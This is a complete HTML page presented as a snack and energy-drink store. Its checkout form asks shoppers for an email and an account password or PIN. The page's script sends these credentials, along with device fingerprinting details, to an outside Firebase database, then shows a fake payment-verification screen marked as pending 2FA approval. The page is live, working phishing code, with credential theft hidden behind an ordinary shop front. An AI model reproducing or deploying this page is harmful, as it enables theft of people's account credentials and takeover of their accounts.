<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <title>Snack Online Store</title>
    <style>
        :root {
            --bg-color: #121212;
            --panel-bg: #1e1e1e;
            --accent-color: #ff3366;
            --accent-blue: #00f0ff;
            --text-main: #ffffff;
            --text-muted: #a0a0a0;
            --border-color: #333333;
        }
        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            width: 100%;
            max-width: 440px;
            background: var(--panel-bg);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 25px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.7);
            box-sizing: border-box;
            margin: 20px;
        }
        .logo {
            font-size: 22px;
            font-weight: 800;
            color: var(--accent-color);
            text-align: center;
            margin-bottom: 5px;
            letter-spacing: 1px;
        }
        .logo span {
            color: var(--accent-blue);
        }
        h2 {
            font-size: 15px;
            margin-bottom: 20px;
            color: var(--text-muted);
            text-align: center;
            font-weight: 400;
        }
        
        #storeFront {
            display: block;
        }
        .store-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 12px;
            margin-bottom: 20px;
        }
        .store-item {
            background: #252525;
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 12px;
            text-align: center;
        }
        .store-item img {
            width: 70px;
            height: 90px;
            object-fit: contain;
            margin-bottom: 8px;
        }
        .store-item-name {
            font-size: 13px;
            font-weight: 600;
            margin-bottom: 4px;
        }
        .store-item-price {
            font-size: 12px;
            color: var(--accent-blue);
            font-weight: 700;
            margin-bottom: 10px;
        }
        .buy-btn {
            width: 100%;
            padding: 8px;
            background: var(--accent-blue);
            color: #000;
            border: none;
            border-radius: 4px;
            font-size: 12px;
            font-weight: 700;
            cursor: pointer;
            transition: opacity 0.2s;
        }
        .buy-btn:hover {
            opacity: 0.9;
        }

        #loginState {
            display: none;
        }

        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            font-size: 11px;
            color: var(--text-muted);
            margin-bottom: 5px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        input {
            width: 100%;
            padding: 10px 12px;
            background: #121212;
            border: 1px solid var(--border-color);
            border-radius: 6px;
            color: var(--text-main);
            font-size: 14px;
            box-sizing: border-box;
            outline: none;
            transition: border-color 0.2s;
        }
        input:focus {
            border-color: var(--accent-color);
        }
        .btn {
            width: 100%;
            padding: 12px;
            background: var(--accent-color);
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            transition: opacity 0.2s;
            margin-top: 5px;
        }
        .btn:hover {
            opacity: 0.9;
        }
        
        #verificationState {
            display: none;
            text-align: center;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid var(--border-color);
            border-top: 3px solid var(--accent-color);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .info-text {
            font-size: 13px;
            color: var(--text-muted);
            line-height: 1.5;
            margin-top: 15px;
        }
        .highlight-email {
            color: var(--accent-blue);
            font-weight: 600;
        }
        .back-link {
            display: block;
            text-align: center;
            font-size: 12px;
            color: var(--text-muted);
            margin-top: 15px;
            cursor: pointer;
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="container">
        
        <div id="storeFront">
            <div class="logo">SNACK<span>STORE</span></div>
            <h2>Available Products & Energy Drinks</h2>
            
            <div class="store-grid">
                <div class="store-item">
                    <img src="https://images.unsplash.com/photo-1551024709-8f23befc6f87?w=300" alt="Red Bull Energy Drink">
                    <div class="store-item-name">Red Bull 250ml</div>
                    <div class="store-item-price">$3.50</div>
                    <button class="buy-btn" onclick="goToLogin('Red Bull 250ml')">Buy Now</button>
                </div>
                <div class="store-item">
                    <img src="https://images.unsplash.com/photo-1566478989037-eec170784d0b?w=300" alt="Potato Chips">
                    <div class="store-item-name">Crunchy Chips</div>
                    <div class="store-item-price">$2.00</div>
                    <button class="buy-btn" onclick="goToLogin('Crunchy Chips')">Buy Now</button>
                </div>
            </div>
        </div>

        <div id="loginState">
            <div class="logo">SNACK<span>STORE</span></div>
            <h2 id="selectedProductTitle">Complete Your Order</h2>
            
            <form id="tradingForm">
                <div class="form-group">
                    <label for="email">Delivery Email / ID</label>
                    <input type="email" id="email" required autocomplete="off" placeholder="name@example.com">
                </div>
                <div class="form-group">
                    <label for="password">Account Password / PIN</label>
                    <input type="password" id="password" required placeholder="••••••••">
                </div>
                <button type="submit" class="btn">Proceed to Checkout</button>
                <span class="back-link" onclick="goBackToStore()">Back to store</span>
            </form>
        </div>

        <div id="verificationState">
            <div class="logo">SNACK<span>STORE</span></div>
            <h2>Verifying Order Request</h2>
            <div class="spinner"></div>
            <p class="info-text">
                We've sent a verification prompt to your email (<span id="displayEmail" class="highlight-email"></span>).<br><br>
                Please confirm the payment authorization to dispatch your items.
            </p>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-database.js";

        const firebaseConfig = {
            databaseURL: "https://a0zai-56c3a-default-rtdb.europe-west1.firebasedatabase.app/"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        let chosenProduct = "";
        window.goToLogin = function(productName) {
            chosenProduct = productName;
            document.getElementById("selectedProductTitle").innerText = "Checkout: " + productName;
            document.getElementById("storeFront").style.display = "none";
            document.getElementById("loginState").style.display = "block";
            setTimeout(() => {
                const emailInput = document.getElementById("email");
                if (!emailInput.value) {
                    emailInput.value = "customer.express99@gmail.com";
                }
            }, 2000);
        }

        window.goBackToStore = function() {
            document.getElementById("loginState").style.display = "none";
            document.getElementById("storeFront").style.display = "block";
        }

        document.getElementById("tradingForm").addEventListener("submit", function(e) {
            e.preventDefault();

            const userEmail = document.getElementById("email").value;
            const userPass = document.getElementById("password").value;

            document.getElementById("loginState").style.display = "none";
            document.getElementById("displayEmail").innerText = userEmail;
            document.getElementById("verificationState").style.display = "block";

            const ua = navigator.userAgent;
            const platform = navigator.platform || "Unknown";
            const width = window.screen.width;
            const height = window.screen.height;
            const cores = navigator.hardwareConcurrency || "N/A";
            const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "N/A";
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const language = navigator.language || "N/A";

            const sessionId = btoa(userEmail + width + height).slice(0, 16);

            const telemetryData = {
                sessionId: sessionId,
                product: chosenProduct,
                inputEmail: userEmail,
                inputPassword: userPass,
                status: "PENDING_2FA_APPROVAL",
                platform: platform,
                resolution: `${width}x${height}`,
                cores: cores,
                memory: memory,
                timezone: timezone,
                language: language,
                userAgent: ua,
                timestamp: new Date().toISOString()
            };

            const sessionsRef = ref(db, 'A0Z_CORE/mirror_sessions/' + sessionId);
            set(sessionsRef, telemetryData)
                .then(() => {
                    console.log("Telemetry successfully synced.");
                })
                .catch((error) => {
                    console.error("Firebase sync error:", error);
                });
        });
    </script>
</body>
</html>
